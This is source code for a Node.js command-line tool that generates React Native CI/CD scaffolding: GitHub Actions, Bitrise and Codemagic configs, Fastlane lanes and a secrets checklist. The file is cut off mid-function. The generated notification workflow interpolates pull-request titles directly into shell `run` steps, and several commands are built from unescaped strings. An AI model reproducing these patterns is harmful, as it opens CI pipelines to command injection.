#!/usr/bin/env node

const fs = require("fs");
const path = require("path");
const { execSync, execFileSync } = require("child_process");
const inquirer = require("inquirer").default;

const CONFIG_FILE = ".rn-ci-setup.json";

function hasFlag(name) {
  return process.argv.includes(`--${name}`);
}

function getArg(index) {
  return process.argv[index];
}

function getFlagValue(name) {
  const idx = process.argv.indexOf(`--${name}`);
  return idx >= 0 ? process.argv[idx + 1] : undefined;
}

function ensureDir(dirPath) {
  fs.mkdirSync(dirPath, { recursive: true });
}

function writeFileSafe(targetPath, content) {
  const dirPath = path.dirname(targetPath);
  ensureDir(dirPath);
  const exists = fs.existsSync(targetPath);
  fs.writeFileSync(targetPath, content, "utf8");
  console.log(`${exists ? "Updated" : "Created"} ${path.relative(process.cwd(), targetPath)}`);
}

function readJsonSafe(filePath) {
  if (!fs.existsSync(filePath)) return null;
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf8"));
  } catch (_error) {
    return null;
  }
}

function readEnvFile(filePath) {
  if (!fs.existsSync(filePath)) return {};
  const env = {};
  const lines = fs.readFileSync(filePath, "utf8").split(/\r?\n/);
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) continue;
    const idx = trimmed.indexOf("=");
    if (idx < 0) continue;
    const key = trimmed.slice(0, idx).trim();
    env[key] = trimmed.slice(idx + 1).trim();
  }
  return env;
}

function detectRnApps(rootDir) {
  const searchRoots = [".", "apps", "packages"];
  const detected = new Set();

  for (const searchRoot of searchRoots) {
    const absRoot = path.join(rootDir, searchRoot);
    if (!fs.existsSync(absRoot) || !fs.statSync(absRoot).isDirectory()) continue;
    const entries = fs.readdirSync(absRoot, { withFileTypes: true });
    const candidates = searchRoot === "." ? ["."] : [];
    for (const entry of entries) {
      if (!entry.isDirectory() || entry.name.startsWith(".")) continue;
      candidates.push(path.join(searchRoot, entry.name));
    }

    for (const rel of candidates) {
      const pkgPath = path.join(rootDir, rel, "package.json");
      if (!fs.existsSync(pkgPath)) continue;
      const pkg = readJsonSafe(pkgPath);
      const deps = Object.assign({}, pkg?.dependencies || {}, pkg?.devDependencies || {});
      const isRn = Boolean(deps["react-native"] || deps["expo"]);
      const hasNative = fs.existsSync(path.join(rootDir, rel, "android")) || fs.existsSync(path.join(rootDir, rel, "ios"));
      if (isRn || hasNative) detected.add(rel.replace(/\\/g, "/"));
    }
  }

  return Array.from(detected).sort();
}

function getRelativeWorkDir(targetRoot) {
  const rel = path.relative(process.cwd(), targetRoot).replace(/\\/g, "/");
  return rel || ".";
}

function isInsideGitWorkTree(cwd) {
  try {
    execSync("git rev-parse --is-inside-work-tree", { cwd, stdio: "ignore" });
    return true;
  } catch (_e) {
    return false;
  }
}

function getGitTopLevel(startDir) {
  try {
    return execSync("git rev-parse --show-toplevel", { cwd: startDir, encoding: "utf8" }).trim();
  } catch (_e) {
    return null;
  }
}

function hasAnyCommit(cwd) {
  try {
    execSync("git rev-parse HEAD", { cwd, stdio: "ignore" });
    return true;
  } catch (_e) {
    return false;
  }
}

function hasOriginRemote(cwd) {
  try {
    const url = execSync("git remote get-url origin", { cwd, encoding: "utf8" }).trim();
    return Boolean(url);
  } catch (_e) {
    return false;
  }
}

function listGitBranches(cwd) {
  try {
    const out = execSync("git branch -a", { cwd, encoding: "utf8" });
    const names = new Set();
    for (const raw of out.split(/\r?\n/)) {
      let b = raw.trim();
      if (!b) continue;
      if (b.startsWith("*")) b = b.slice(1).trim();
      b = b.replace(/^remotes\/origin\//, "");
      if (!b || b === "HEAD" || b.includes("->")) continue;
      names.add(b);
    }
    return Array.from(names).sort();
  } catch (_e) {
    return [];
  }
}

function gitCheckoutBranch(cwd, branch) {
  try {
    execSync(`git checkout ${branch}`, { cwd, stdio: "inherit" });
    return;
  } catch (_e) {
    execSync("git fetch origin", { cwd, stdio: "inherit" });
    execSync(`git checkout -B ${branch} refs/remotes/origin/${branch}`, { cwd, stdio: "inherit" });
  }
}

function ensureRootGemfileWithFastlane(targetRoot) {
  const gemfilePath = path.join(targetRoot, "Gemfile");
  const marker = 'gem "fastlane"';
  if (fs.existsSync(gemfilePath)) {
    const existing = fs.readFileSync(gemfilePath, "utf8");
    if (existing.includes("fastlane")) return;
    const suffix = existing.endsWith("\n") ? "" : "\n";
    fs.writeFileSync(gemfilePath, `${existing}${suffix}\n${marker}\n`, "utf8");
    console.log(`Updated ${path.relative(process.cwd(), gemfilePath)} (added fastlane)`);
    return;
  }
  writeFileSafe(gemfilePath, getRootGemfile());
}

function runBundleInstallIfGemfile(dir, label) {
  const gemfile = path.join(dir, "Gemfile");
  const rel = path.relative(process.cwd(), dir) || ".";
  if (!fs.existsSync(gemfile)) {
    console.log(`No Gemfile in ${rel}${label ? ` (${label})` : ""}; skipping bundle install there.`);
    return;
  }
  console.log(`\nRunning bundle install in ${rel}${label ? ` (${label})` : ""}...`);
  execSync("bundle install", { cwd: dir, stdio: "inherit" });
}

async function runStage(name, fn, optional = false) {
  console.log(`\n== ${name} ==`);
  try {
    return await fn();
  } catch (error) {
    if (optional) {
      console.warn(`Warning in optional stage "${name}": ${error.message || error}`);
      return undefined;
    }
    throw error;
  }
}

function runFastlaneIosSetup(targetRoot) {
  const iosDir = path.join(targetRoot, "ios");
  if (!fs.existsSync(iosDir)) {
    console.log("Skipping iOS Fastlane (no ios/ directory).");
    return;
  }
  const fastlaneDir = path.join(iosDir, "fastlane");
  const matchfile = path.join(fastlaneDir, "Matchfile");

  if (!fs.existsSync(fastlaneDir)) {
    console.log("\nRunning iOS Fastlane initialization (interactive): bundle exec fastlane init");
    execSync("cd ios && bundle exec fastlane init", { cwd: targetRoot, stdio: "inherit" });
  }

  if (!fs.existsSync(matchfile)) {
    console.log("\nRunning iOS Fastlane Match initialization (interactive): bundle exec fastlane match init");
    execSync("cd ios && bundle exec fastlane match init", { cwd: targetRoot, stdio: "inherit" });
  }

  console.log("\nRunning iOS signing setup: bundle exec fastlane match appstore");
  execSync("cd ios && bundle exec fastlane match appstore", { cwd: targetRoot, stdio: "inherit" });
  console.log("\nRunning iOS signing setup: bundle exec fastlane match development");
  execSync("cd ios && bundle exec fastlane match development", { cwd: targetRoot, stdio: "inherit" });
}

function runFastlaneAndroidSetup(targetRoot) {
  const androidDir = path.join(targetRoot, "android");
  if (!fs.existsSync(androidDir)) {
    console.log("Skipping Android Fastlane (no android/ directory).");
    return;
  }
  const fastlaneDir = path.join(androidDir, "fastlane");
  if (!fs.existsSync(fastlaneDir)) {
    console.log("\nRunning Android Fastlane initialization (interactive): bundle exec fastlane init");
    execSync("cd android && bundle exec fastlane init", { cwd: targetRoot, stdio: "inherit" });
  } else {
    console.log("Android Fastlane already initialized.");
  }
}

function gitAddCommitPush(cwd, paths, message) {
  if (hasFlag("skip-push")) {
    console.log("\nSkipping git commit/push (--skip-push).");
    return;
  }
  const existing = paths.filter((p) => fs.existsSync(p));
  if (!existing.length) return;
  for (const p of existing) {
    execFileSync("git", ["add", p], { cwd, stdio: "inherit" });
  }
  try {
    execFileSync("git", ["commit", "-m", message], { cwd, stdio: "inherit" });
  } catch (_e) {
    console.log("Nothing to commit or commit skipped (no staged changes).");
    return;
  }
  execFileSync("git", ["push", "-u", "origin", "HEAD"], { cwd, stdio: "inherit" });
}

async function resolveGitRemoteAndBranch(cwd) {
  if (!isInsideGitWorkTree(cwd)) {
    console.log("Not a git repository. Running git init...");
    execSync("git init", { cwd, stdio: "inherit" });
  }

  if (!hasOriginRemote(cwd)) {
    ensureGhAvailable();
    const { create } = await inquirer.prompt([
      {
        type: "confirm",
        name: "create",
        message: "No git remote (origin) found. Create a new GitHub repository and push the master branch?",
        default: true
      }
    ]);
    if (!create) {
      throw new Error("Add a Git remote named origin, then rerun rn-ci-setup init.");
    }

    const defaultName = path.basename(path.resolve(cwd));
    const ans = await inquirer.prompt([
      { type: "input", name: "repoName", message: "New GitHub repository name:", default: defaultName },
      {
        type: "list",
        name: "visibility",
        message: "Repository visibility:",
        choices: ["private", "public"],
        default: "private"
      }
    ]);
    const vis = ans.visibility === "public" ? "--public" : "--private";

    if (!hasAnyCommit(cwd)) {
      execSync("git commit --allow-empty -m \"chore: initial commit\"", { cwd, stdio: "inherit" });
    }
    execSync("git branch -M master", { cwd, stdio: "inherit" });

    execSync(`gh repo create ${ans.repoName} ${vis} --source=. --remote=origin --push`, { cwd, stdio: "inherit" });
    console.log("Repository created and pushed to master.");
    return { branch: "master" };
  }

  let unique = listGitBranches(cwd);
  if (!unique.length) {
    execSync("git fetch origin", { cwd, stdio: "inherit" });
    unique = listGitBranches(cwd);
  }
  if (!unique.length) throw new Error("No branches found on origin. Push a branch first or create a new repository.");
  unique = Array.from(new Set(unique)).sort();
  const { branch } = await inquirer.prompt([
    {
      type: "list",
      name: "branch",
      message: "Select the branch to use for CI setup (workflows and commits use this branch):",
      choices: unique,
      default: unique.includes("master") ? "master" : unique.includes("main") ? "main" : unique[0]
    }
  ]);
  gitCheckoutBranch(cwd, branch);
  try {
    execSync("git pull --ff-only", { cwd, stdio: "inherit" });
  } catch (_e) {
    console.log("Note: git pull --ff-only failed; continuing with current checkout.");
  }
  return { branch };
}

function getBashCdPrefix(wd) {
  return wd === "." ? "" : `cd ${wd} && `;
}

function getNotificationJobs(options) {
  if (options.ciProvider !== "github") return "";
  if (!options.notifications?.slack && !options.notifications?.discord && !options.notifications?.teams) return "";

  const eventMessage = "rn-ci-setup | ${GITHUB_REPOSITORY} | workflow=${GITHUB_WORKFLOW} | event=${GITHUB_EVENT_NAME} | ref=${GITHUB_REF_NAME} | status=${{ needs.build.result }}";
  const mergeMessage = "rn-ci-setup | ${GITHUB_REPOSITORY} | PR merged #${{ github.event.pull_request.number }} - ${{ github.event.pull_request.title }}";

  const lines = [
    "",
    "  notify:",
    "    runs-on: ubuntu-latest",
    "    needs: [build]",
    "    if: always()",
    "    steps:"
  ];

  if (options.notifications.slack) {
    lines.push("      - name: Notify Slack");
    lines.push("        if: ${{ secrets.SLACK_WEBHOOK_URL != '' }}");
    lines.push("        run: |");
    lines.push(`          curl -X POST -H "Content-Type: application/json" --data "{\\\"text\\\":\\\"${eventMessage}\\\"}" "$SLACK_WEBHOOK_URL"`);
    lines.push("        env:");
    lines.push("          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}");
  }

  if (options.notifications.discord) {
    lines.push("      - name: Notify Discord");
    lines.push("        if: ${{ secrets.DISCORD_WEBHOOK_URL != '' }}");
    lines.push("        run: |");
    lines.push(`          curl -X POST -H "Content-Type: application/json" --data "{\\\"content\\\":\\\"${eventMessage}\\\"}" "$DISCORD_WEBHOOK_URL"`);
    lines.push("        env:");
    lines.push("          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}");
  }

  if (options.notifications.teams) {
    lines.push("      - name: Notify Microsoft Teams");
    lines.push("        if: ${{ secrets.TEAMS_WEBHOOK_URL != '' }}");
    lines.push("        run: |");
    lines.push(`          curl -X POST -H "Content-Type: application/json" --data "{\\\"text\\\":\\\"${eventMessage}\\\"}" "$TEAMS_WEBHOOK_URL"`);
    lines.push("        env:");
    lines.push("          TEAMS_WEBHOOK_URL: ${{ secrets.TEAMS_WEBHOOK_URL }}");
  }

  lines.push("");
  lines.push("  notify_pr_merged:");
  lines.push("    runs-on: ubuntu-latest");
  lines.push("    if: github.event_name == 'pull_request' && github.event.action == 'closed' && github.event.pull_request.merged == true");
  lines.push("    steps:");

  if (options.notifications.slack) {
    lines.push("      - name: Notify Slack PR merged");
    lines.push("        if: ${{ secrets.SLACK_WEBHOOK_URL != '' }}");
    lines.push("        run: |");
    lines.push(`          curl -X POST -H "Content-Type: application/json" --data "{\\\"text\\\":\\\"${mergeMessage}\\\"}" "$SLACK_WEBHOOK_URL"`);
    lines.push("        env:");
    lines.push("          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}");
  }

  if (options.notifications.discord) {
    lines.push("      - name: Notify Discord PR merged");
    lines.push("        if: ${{ secrets.DISCORD_WEBHOOK_URL != '' }}");
    lines.push("        run: |");
    lines.push(`          curl -X POST -H "Content-Type: application/json" --data "{\\\"content\\\":\\\"${mergeMessage}\\\"}" "$DISCORD_WEBHOOK_URL"`);
    lines.push("        env:");
    lines.push("          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}");
  }

  if (options.notifications.teams) {
    lines.push("      - name: Notify Teams PR merged");
    lines.push("        if: ${{ secrets.TEAMS_WEBHOOK_URL != '' }}");
    lines.push("        run: |");
    lines.push(`          curl -X POST -H "Content-Type: application/json" --data "{\\\"text\\\":\\\"${mergeMessage}\\\"}" "$TEAMS_WEBHOOK_URL"`);
    lines.push("        env:");
    lines.push("          TEAMS_WEBHOOK_URL: ${{ secrets.TEAMS_WEBHOOK_URL }}");
  }

  return `\n${lines.join("\n")}\n`;
}

function getAndroidWorkflow(options) {
  const wd = getRelativeWorkDir(options.targetRoot);
  const expoPrebuild = options.template === "expo"
    ? `\n      - name: Expo prebuild (Android)\n        run: npx expo prebuild --platform android --non-interactive\n        working-directory: ${wd}\n`
    : "";

  return `name: Android CI/CD

on:
  push:
    branches: [master, main]
  pull_request:
    branches: [master, main]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - name: Install deps
        run: npm ci
        working-directory: ${wd}
      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: 17${expoPrebuild}
      - name: Install Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: "3.2"
      - name: Install gems
        run: bundle install
        working-directory: ${wd}
      - name: Ensure gradlew executable
        run: chmod +x android/gradlew
        working-directory: ${wd}
      - name: Android CI lane (PR)
        if: github.event_name == 'pull_request'
        run: cd android && bundle exec fastlane ci
        working-directory: ${wd}
      - name: Android beta lane (push main/master)
        if: github.event_name == 'push'
        run: cd android && bundle exec fastlane beta
        working-directory: ${wd}
      - name: Android release lane (manual)
        if: github.event_name == 'workflow_dispatch'
        run: cd android && bundle exec fastlane release
        working-directory: ${wd}
${getNotificationJobs(options)}`;
}

function getIosWorkflow(options) {
  const wd = getRelativeWorkDir(options.targetRoot);
  const expoPrebuild = options.template === "expo"
    ? `\n      - name: Expo prebuild (iOS)\n        run: npx expo prebuild --platform ios --non-interactive\n        working-directory: ${wd}\n`
    : "";
  return `name: iOS CI/CD

on:
  push:
    branches: [master, main]
  pull_request:
    branches: [master, main]
  workflow_dispatch:

jobs:
  build:
    runs-on: macos-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - name: Install deps
        run: npm ci
        working-directory: ${wd}
      - name: Install Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: "3.2"${expoPrebuild}
      - name: Install gems
        run: bundle install
        working-directory: ${wd}
      - name: Install CocoaPods
        run: pod install
        working-directory: ${wd}/ios
      - name: iOS CI lane (PR)
        if: github.event_name == 'pull_request'
        run: cd ios && bundle exec fastlane ci
        working-directory: ${wd}
      - name: iOS beta lane (push main/master)
        if: github.event_name == 'push'
        run: cd ios && bundle exec fastlane beta
        working-directory: ${wd}
      - name: iOS release lane (manual)
        if: github.event_name == 'workflow_dispatch'
        run: cd ios && bundle exec fastlane release
        working-directory: ${wd}
${getNotificationJobs(options)}`;
}

function getRootGemfile() {
  return `source "https://rubygems.org"

gem "fastlane"
`;
}

function getIosFastfile() {
  return `default_platform(:ios)

platform :ios do
  desc "CI checks/tests lane"
  lane :ci do
    setup_ci if is_ci
    sh("bundle exec pod install")
    scan(
      scheme: ENV["IOS_SCHEME"] || "App",
      clean: true
    )
  end

  desc "Build and upload to TestFlight"
  lane :beta do
    app_store_connect_api_key(
      key_id: ENV["APP_STORE_CONNECT_KEY_ID"],
      issuer_id: ENV["APP_STORE_CONNECT_ISSUER_ID"],
      key_content: ENV["APP_STORE_CONNECT_PRIVATE_KEY"]
    )
    match(type: "appstore", readonly: true)
    increment_build_number(
      xcodeproj: ENV["IOS_XCODEPROJ"] || "ios/App.xcodeproj"
    )
    build_app(
      workspace: ENV["IOS_WORKSPACE"] || "App.xcworkspace",
      scheme: ENV["IOS_SCHEME"] || "App",
      export_method: "app-store"
    )
    upload_to_testflight(skip_waiting_for_build_processing: true)
  end

  desc "Submit build to App Store"
  lane :release do
    app_store_connect_api_key(
      key_id: ENV["APP_STORE_CONNECT_KEY_ID"],
      issuer_id: ENV["APP_STORE_CONNECT_ISSUER_ID"],
      key_content: ENV["APP_STORE_CONNECT_PRIVATE_KEY"]
    )
    match(type: "appstore", readonly: true)
    build_app(
      workspace: ENV["IOS_WORKSPACE"] || "App.xcworkspace",
      scheme: ENV["IOS_SCHEME"] || "App",
      export_method: "app-store"
    )
    upload_to_app_store
  end
end
`;
}

function getAndroidFastfile() {
  return `default_platform(:android)

platform :android do
  desc "Android CI checks/build"
  lane :ci do
    gradle(task: "clean")
    gradle(task: "assembleDebug")
  end

  desc "Android beta artifact build"
  lane :beta do
    gradle(task: "assembleRelease")
  end

  desc "Android release artifact build"
  lane :release do
    gradle(task: "bundleRelease")
  end
end
`;
}

function getIosAppfile() {
  return `app_identifier(ENV["APPLE_APP_IDENTIFIER"])
apple_id(ENV["APPLE_ID"])
itc_team_id(ENV["APP_STORE_CONNECT_TEAM_ID"])
team_id(ENV["APPLE_TEAM_ID"])
`;
}

function getIosMatchfile() {
  return `git_url(ENV["MATCH_GIT_URL"])
storage_mode("git")
type("appstore")
app_identifier([ENV["APPLE_APP_IDENTIFIER"]])
username(ENV["APPLE_ID"])
`;
}

function getBitriseConfig(options) {
  const wd = getRelativeWorkDir(options.targetRoot);
  const cdPrefix = getBashCdPrefix(wd);
  const lines = [
    "format_version: '11'",
    "default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git",
    "project_type: react-native",
    "workflows:",
    "  primary:",
    "    steps:",
    "      - activate-ssh-key@4: {}",
    "      - git-clone@8: {}",
    "      - npm@1:",
    "          inputs:",
    "            - command: ci"
  ];

  if (options.template === "expo") {
    if (options.targets.android) {
      lines.push("      - script@1:");
      lines.push("          title: Expo prebuild Android");
      lines.push(`          inputs: ["content: |\\n              ${cdPrefix}npx expo prebuild --platform android --non-interactive"]`);
    }
    if (options.targets.ios) {
      lines.push("      - script@1:");
      lines.push("          title: Expo prebuild iOS");
      lines.push(`          inputs: ["content: |\\n              ${cdPrefix}npx expo prebuild --platform ios --non-interactive"]`);
    }
  }

  if (options.targets.android) {
    lines.push("      - script@1:");
    lines.push("          title: Build Android release");
    lines.push(`          inputs: ["content: |\\n              ${cdPrefix}cd android && ./gradlew assembleRelease"]`);
  }
  if (options.targets.ios) {
    lines.push("      - script@1:");
    lines.push("          title: Build iOS");
    lines.push(
      `          inputs: ["content: |\\n              ${cdPrefix}cd ios && pod install && xcodebuild -workspace *.xcworkspace -scheme \${IOS_SCHEME:-App} -sdk iphonesimulator -configuration Release build"]`
    );
  }

  return `${lines.join("\n")}\n`;
}

function getCodemagicConfig(options) {
  const wd = getRelativeWorkDir(options.targetRoot);
  const rootPrefix = wd === "." ? "" : `${wd}/`;
  const scripts = ["      - name: Install deps", `        script: cd ${wd} && npm ci`];

  if (options.template === "expo") {
    if (options.targets.android) {
      scripts.push("      - name: Expo prebuild Android");
      scripts.push(`        script: cd ${wd} && npx expo prebuild --platform android --non-interactive`);
    }
    if (options.targets.ios) {
      scripts.push("      - name: Expo prebuild iOS");
      scripts.push(`        script: cd ${wd} && npx expo prebuild --platform ios --non-interactive`);
    }
  }

  if (options.targets.android) {
    scripts.push("      - name: Build Android");
    scripts.push(`        script: cd ${wd}/android && ./gradlew assembleRelease`);
  }
  if (options.targets.ios) {
    scripts.push("      - name: Build iOS");
    scripts.push(
      `        script: cd ${wd}/ios && pod install && xcodebuild -workspace *.xcworkspace -scheme \${IOS_SCHEME:-App} -sdk iphonesimulator -configuration Release build`
    );
  }

  return `workflows:
  react_native_ci:
    name: React Native CI
    max_build_duration: 120
    environment:
      node: 20
      xcode: latest
    scripts:
${scripts.join("\n")}
    artifacts:
      - ${rootPrefix}android/app/build/outputs/**/*.apk
      - ${rootPrefix}android/app/build/outputs/**/*.aab
`;
}

async function resolveCiProvider() {
  const flagProvider = getFlagValue("ci-provider");
  if (flagProvider) {
    const normalized = flagProvider.toLowerCase();
    if (["github", "bitrise", "codemagic"].includes(normalized)) return normalized;
    throw new Error(`Unsupported --ci-provider value "${flagProvider}". Use github, bitrise, or codemagic.`);
  }

  const answers = await inquirer.prompt([
    {
      type: "list",
      name: "ciProvider",
      message: "Choose CI provider:",
      choices: [
        { name: "GitHub Actions", value: "github" },
        { name: "Bitrise", value: "bitrise" },
        { name: "Codemagic", value: "codemagic" }
      ],
      default: "github"
    }
  ]);
  return answers.ciProvider;
}

function getSecretsChecklist(options) {
  const required = ["NODE_ENV"];
  const recommended = [];

  if (options.targets.android) {
    required.push("ANDROID_KEYSTORE_BASE64", "ANDROID_KEYSTORE_PASSWORD", "ANDROID_KEY_ALIAS", "ANDROID_KEY_PASSWORD");
  }

  if (options.targets.ios) {
    recommended.push("IOS_SCHEME", "IOS_WORKSPACE");
    required.push(
      "APP_STORE_CONNECT_KEY_ID",
      "APP_STORE_CONNECT_ISSUER_ID",
      "APP_STORE_CONNECT_PRIVATE_KEY",
      "MATCH_GIT_URL",
      "MATCH_PASSWORD",
      "APPLE_APP_IDENTIFIER",
      "APPLE_TEAM_ID"
    );
    recommended.push("APP_STORE_CONNECT_TEAM_ID", "FASTLANE_USER");
  }

  if (options.notifications?.slack) required.push("SLACK_WEBHOOK_URL");
  if (options.notifications?.discord) required.push("DISCORD_WEBHOOK_URL");
  if (options.notifications?.teams) required.push("TEAMS_WEBHOOK_URL");

  return { required, recommended };
}

function getEnvExample(options) {
  const lines = ["# Shared", "NODE_ENV=production", ""];
  if (options.targets.android) {
    lines.push("# Android", "ANDROID_KEYSTORE_BASE64=", "ANDROID_KEYSTORE_PASSWORD=", "ANDROID_KEY_ALIAS=", "ANDROID_KEY_PASSWORD=");
    lines.push("");
  }
  if (options.targets.ios) {
    lines.push("# iOS", "IOS_SCHEME=App", "IOS_WORKSPACE=ios/App.xcworkspace");
    lines.push("APP_STORE_CONNECT_KEY_ID=", "APP_STORE_CONNECT_ISSUER_ID=", "APP_STORE_CONNECT_PRIVATE_KEY=");
    lines.push("APPLE_ID=", "APPLE_TEAM_ID=", "APP_STORE_CONNECT_TEAM_ID=", "FASTLANE_USER=");
    lines.push("APPLE_APP_IDENTIFIER=com.example.app");
    lines.push("MATCH_GIT_URL=", "MATCH_PASSWORD=");
    lines.push("");
  }
  return `${lines.join("\n")}\n`;
}

function getEnvProduction(options) {
  const lines = ["NODE_ENV=production"];
  if (options.targets.ios) lines.push("IOS_SCHEME=App", "IOS_WORKSPACE=ios/App.xcworkspace");
  return `${lines.join("\n")}\n`;
}

function getSecretsGuide(options) {
  const checklist = getSecretsChecklist(options);
  const secretsLocation =
    options.ciProvider === "github"
      ? "GitHub repo -> Settings -> Secrets and variables -> Actions"
      : options.ciProvider === "bitrise"
        ? "Bitrise app -> Workflow Editor -> Secrets"
        : "Codemagic app -> Environment variables";
  const lines = [
    "# CI Secrets checklist",
    "",
    `Add these in: ${secretsLocation}`,
    "",
    `- App path: \`${options.appPath}\``,
    `- CI provider: \`${options.ciProvider}\``,
    `- Template: \`${options.template}\``,
    "",
    "## Required"
  ];
  for (const key of checklist.required) lines.push(`- [ ] ${key}`);
  lines.push("", "## Recommended");
  for (const key of checklist.recommended) lines.push(`- [ ] ${key}`);
  if (options.ciProvider === "github") {
    lines.push("", "Create GitHub secrets automatically:", "```bash", "rn-ci-setup secrets", "```", "");
  }
  lines.push("", "Validate locally:", "```bash", "rn-ci-setup doctor", "```", "");
  return `${lines.join("\n")}\n`;
}

async function resolveAppPath(cwd) {
  const flagPath = getFlagValue("app-path");
  if (flagPath) return flagPath;
  const apps = detectRnApps(cwd);
  if (apps.length <= 1) return apps[0] || ".";
  const answers = await inquirer.prompt([{ type: "list", name: "appPath", message: "Detected multiple React Native apps. Pick one:", choices: apps }]);
  return answers.appPath;
}

async function resolveTargets() {
  const cliTargets = { android: hasFlag("android"), ios: hasFlag("ios") };
  if (cliTargets.android || cliTargets.ios) return cliTargets;
  const answers = await inquirer.prompt([
    {
      type: "checkbox",
      name: "platforms",
      message: "Which platform CI/CD do you want to generate?",
      choices: [{ name: "Android", value: "android", checked: true }, { name: "iOS", value: "ios", checked: true }],
      validate: (value) => (value.length > 0 ? true : "Select at least one platform.")
    }
  ]);
  return { android: answers.platforms.includes("android"), ios: answers.platforms.includes("ios") };
}

async function resolveTemplate() {
  if (hasFlag("expo")) return "expo";
  if (hasFlag("bare")) return "bare";
  const answers = await inquirer.prompt([
    {
      type: "list",
      name: "template",
      message: "Project template type?",
      choices: [{ name: "Bare React Native", value: "bare" }, { name: "Expo (prebuild in CI)", value: "expo" }],
      default: "bare"
    }
  ]);
  return answers.template;
}

async function resolveNotifications() {
  const fromFlags = {
    slack: hasFlag("notify-slack"),
    discord: hasFlag("notify-discord"),
    teams: hasFlag("notify-teams")
  };

  if (fromFlags.slack || fromFlags.discord || fromFlags.teams) {
    return fromFlags;
  }

  const { enable } = await inquirer.prompt([
    {
      type: "confirm",
      name: "enable",
      message: "Do you want CI notifications when workflows finish or PRs merge (Slack, Discord, Microsoft Teams)?",
      default: false
    }
  ]);

  if (!enable) {
    return { slack: false, discord: false, teams: false };
  }

  const answers = await inquirer.prompt([
    {
      type: "checkbox",
      name: "channels",
      message: "Which notification channels should be wired into GitHub Actions?",
      choices: [
        { name: "Slack", value: "slack", checked: true },
        { name: "Discord", value: "discord" },
        { name: "Microsoft Teams", value: "teams" }
      ],
      validate: (value) => (value.length > 0 ? true : "Select at least one channel.")
    }
  ]);

  return {
    slack: answers.channels.includes("slack"),
    discord: answers.channels.includes("discord"),
    teams: answers.channels.includes("teams")
  };
}

function validateAppPath(cwd, appPath, targets) {
  const root = path.join(cwd, appPath);
  if (targets.android && !fs.existsSync(path.join(root, "android"))) throw new Error(`Selected app path "${appPath}" does not contain android/`);
  if (targets.ios && !fs.existsSync(path.join(root, "ios"))) throw new Error(`Selected app path "${appPath}" does not contain ios/`);
}

function writeGithubAutomatedScaffold(options) {
  if (options.targets.android) {
    writeFileSafe(path.join(options.targetRoot, ".github/workflows/android.yml"), getAndroidWorkflow(options));
  }
  if (options.targets.ios) {
    writeFileSafe(path.join(options.targetRoot, ".github/workflows/ios.yml"), getIosWorkflow(options));
    ensureRootGemfileWithFastlane(options.targetRoot);
    writeFileSafe(path.join(options.targetRoot, "ios/fastlane/Fastfile"), getIosFastfile());
    writeFileSafe(path.join(options.targetRoot, "ios/fastlane/Appfile"), getIosAppfile());
    writeFileSafe(path.join(options.targetRoot, "ios/fastlane/Matchfile"), getIosMatchfile());
  }
  if (options.targets.android) {
    writeFileSafe(path.join(options.targetRoot, "android/fastlane/Fastfile"), getAndroidFastfile());
  }
  writeFileSafe(
    path.join(options.targetRoot, CONFIG_FILE),
    `${JSON.stringify(
      {
        version: 6,
        appPath: options.appPath,
        template: options.template,
        ciProvider: "github",
        targets: options.targets,
        notifications: options.notifications
      },
      null,
      2
    )}\n`
  );
}

function writeProviderScaffold(options) {
  if (options.ciProvider === "github") {
    writeGithubAutomatedScaffold(options);
    return;
  }

  if (options.ciProvider === "bitrise") {
    writeFileSafe(path.join(options.targetRoot, "bitrise.yml"), getBitriseConfig(options));
  }
  if (options.ciProvider === "codemagic") {
    writeFileSafe(path.join(options.targetRoot, "codemagic.yaml"), getCodemagicConfig(options));
  }

  if (options.targets.ios) {
    ensureRootGemfileWithFastlane(options.targetRoot);
    writeFileSafe(path.join(options.targetRoot, "ios/fastlane/Fastfile"), getIosFastfile());
    writeFileSafe(path.join(options.targetRoot, "ios/fastlane/Appfile"), getIosAppfile());
    writeFileSafe(path.join(options.targetRoot, "ios/fastlane/Matchfile"), getIosMatchfile());
  }
  if (options.targets.android) {
    writeFileSafe(path.join(options.targetRoot, "android/fastlane/Fastfile"), getAndroidFastfile());
  }

  writeFileSafe(
    path.join(options.targetRoot, CONFIG_FILE),
    `${JSON.stringify(
      {
        version: 7,
        appPath: options.appPath,
        template: options.template,
        ciProvider: options.ciProvider,
        targets: options.targets,
        notifications: options.notifications
      },
      null,
      2
    )}\n`
  );
}

async function runInit() {
  const invocationDir = process.cwd();
  const gitRoot = getGitTopLevel(invocationDir) || invocationDir;

  const { branch } = await runStage("Stage 1/8: Repository and branch setup", () => resolveGitRemoteAndBranch(gitRoot));
  console.log(`Using branch: ${branch}`);

  const appPath = await runStage("Stage 2/8: Resolve app path", () => resolveAppPath(invocationDir));
  const targets = await runStage("Stage 3/8: Choose platforms", () => resolveTargets());
  await runStage("Stage 4/8: Validate app structure", () => validateAppPath(invocationDir, appPath, targets));
  const ciProvider = await runStage("Stage 5/8: Select CI provider", () => resolveCiProvider());
  const template = await runStage("Stage 6/8: Select template", () => resolveTemplate());
  const notifications = ciProvider === "github"
    ? await runStage("Stage 7/8: Configure notifications", () => resolveNotifications())
    : { slack: false, discord: false, teams: false };

  const targetRoot = path.join(invocationDir, appPath);
  const options = {
    appPath,
    targetRoot,
    ciProvider,
    template,
    targets,
    notifications
  };

  await runStage("Stage 7/8: Generate CI and Fastlane files", () => {
    writeProviderScaffold(options);
  });

  if (options.targets.ios || options.targets.android) {
    if (hasFlag("skip-bundle")) {
      console.log("\nSkipping bundle install (--skip-bundle).");
    } else {
      console.log("\nInstalling Ruby gems (Bundler) for Fastlane…");
